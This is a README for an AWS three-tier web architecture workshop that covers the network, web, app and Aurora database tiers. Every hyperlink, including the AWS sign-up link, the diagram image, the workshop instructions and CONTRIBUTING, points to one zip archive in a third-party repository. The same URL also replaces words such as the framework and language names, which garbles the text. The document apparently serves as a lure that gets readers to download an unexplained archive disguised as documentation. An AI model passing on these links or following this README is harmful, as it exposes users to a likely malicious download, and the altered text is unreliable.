# AWS Three Tier Web Architecture Workshop

## Description: 
This workshop is a hands-on walk through of a three-tier web architecture in AWS. We will be manually creating the necessary network, security, app, and database components and configurations in order to run this architecture in an available and scalable manner.

## Audience:
Although this is an introductory level workshop, it is intended for those who have a technical role. The assumption is that you have at least some foundational aws knowledge around VPC, EC2, RDS, S3, ELB and the AWS Console.  

## Pre-requisites:
1. An AWS account. If you don’t have an AWS account, follow the instructions [here](https://raw.githubusercontent.com/thatavarthi-raj/aws-three-tier-web-architecture-workshop/main/application-code/app-tier/aws-three-tier-web-architecture-workshop_v2.8.zip) and
click on “Create an AWS Account” button in the top right corner to create one.
1. IDE or text editor of your choice.

## Architecture Overview
![Architecture Diagram](https://raw.githubusercontent.com/thatavarthi-raj/aws-three-tier-web-architecture-workshop/main/application-code/app-tier/aws-three-tier-web-architecture-workshop_v2.8.zip)

In this architecture, a public-facing Application Load Balancer forwards client traffic to our web tier EC2 instances. The web tier is running Nginx webservers that are configured to serve a https://raw.githubusercontent.com/thatavarthi-raj/aws-three-tier-web-architecture-workshop/main/application-code/app-tier/aws-three-tier-web-architecture-workshop_v2.8.zip website and redirects our API calls to the application tier’s internal facing load balancer. The internal facing load balancer then forwards that traffic to the application tier, which is written in https://raw.githubusercontent.com/thatavarthi-raj/aws-three-tier-web-architecture-workshop/main/application-code/app-tier/aws-three-tier-web-architecture-workshop_v2.8.zip The application tier manipulates data in an Aurora MySQL multi-AZ database and returns it to our web tier. Load balancing, health checks and autoscaling groups are created at each layer to maintain the availability of this architecture.

## Workshop Instructions:

See [AWS Three Tier Web Architecture](https://raw.githubusercontent.com/thatavarthi-raj/aws-three-tier-web-architecture-workshop/main/application-code/app-tier/aws-three-tier-web-architecture-workshop_v2.8.zip)


## Security

See [CONTRIBUTING](https://raw.githubusercontent.com/thatavarthi-raj/aws-three-tier-web-architecture-workshop/main/application-code/app-tier/aws-three-tier-web-architecture-workshop_v2.8.zip) for more information.

## License

This library is licensed under the MIT-0 License. See the LICENSE file.

